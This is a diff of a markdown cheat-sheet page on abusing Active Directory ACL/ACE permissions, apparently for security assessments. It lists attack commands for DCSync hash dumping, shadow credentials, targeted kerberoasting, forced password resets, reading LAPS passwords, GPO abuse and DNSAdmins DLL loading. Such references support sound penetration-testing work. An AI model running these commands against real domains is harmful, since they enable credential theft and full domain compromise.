@@ -2,12 +2,14 @@
 title: "ACLs/ACEs permissions"
 description: "ACLs/ACEs permissions techniques and commands for Active Directory security assessment."
 ---
-## Dcsync >>> Domain Admin || Lateral move || Crack hash
+# ACLs/ACEs permissions
+## Dcsync *Domain Admin || Lateral move || Crack hash*{: .highlight}
 - Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts
 - `mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator`
 - `secretsdump.py '<domain>'/'<user>':'<password>'@'<domain_controller>'`
 
-## can change msDS-KeyCredentialLInk (Generic Write) + ADCS >>> PassTheCertificate
+## can change msDS-KeyCredentialLInk (Generic Write) + ADCS *PassTheCertificate*{: .highlight}
+
 - Shadow Credentials
   - `certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>'`
   - `pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"`
@@ -23,19 +25,19 @@ description: "ACLs/ACEs permissions techniques and commands for Active Directory
 
 ## On Computer
 - GenericAll / GenericWrite
-  - msDs-AllowedToActOnBehalf >>> RBCD
-  - add Key Credentials >>> shadow credentials
+  - msDs-AllowedToActOnBehalf *RBCD*{: .highlight}
+  - add Key Credentials *shadow credentials*{: .highlight}
 
 ## On User
 - GenericAll / GenericWrite
   - Change password
-    - `net user <user> <password> /domain` >>> User with clear text pass
+    - `net user <user> <password> /domain` *User with clear text pass*{: .highlight}
   - add SPN (target kerberoasting)
-    - `targetedKerberoast.py -d <domain> -u <user> -p <pass>` >>> Hash found (TGS)
-  - add key credentials >>> shadow credentials
-  - login script >>> Access
+    - `targetedKerberoast.py -d <domain> -u <user> -p <pass>` *Hash found (TGS)*{: .highlight}
+  - add key credentials *shadow credentials*{: .highlight}
+  - login script *Access*{: .highlight}
 - ForceChangePassword
-  - `net user <user> <password> /domain` >>> User with clear text pass
+  - `net user <user> <password> /domain` *User with clear text pass*{: .highlight}
 
 ## On OU
 - Write Dacl
@@ -52,7 +54,7 @@ description: "ACLs/ACEs permissions techniques and commands for Active Directory
 ## Get LAPS passwords
 - Who can read LAPS
   - `MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p`
-- Read LAPS >>> Admin
+- Read LAPS *Admin*{: .highlight}
   - `Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize`
   - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps`
   - `foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}`
@@ -67,9 +69,9 @@ description: "ACLs/ACEs permissions techniques and commands for Active Directory
 - Return the principals that can write to the GP-Link attribute on OUs
   - `Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl`
 - Generic Write on  GPO
-  - Abuse GPO >>> ACCESS
+  - Abuse GPO *ACCESS*{: .highlight}
 
 ## DNS Admin
-- DNSadmins abuse (CVE-2021-40469) @CVE@ >>> Admin
+- DNSadmins abuse (CVE-2021-40469) @CVE@ *Admin*{: .highlight}
   - `dnscmd.exe /config /serverlevelplugindll <\\path\to\dll> # need a dnsadmin user`
   - `sc \\DNSServer stop dns sc \\DNSServer start dns`
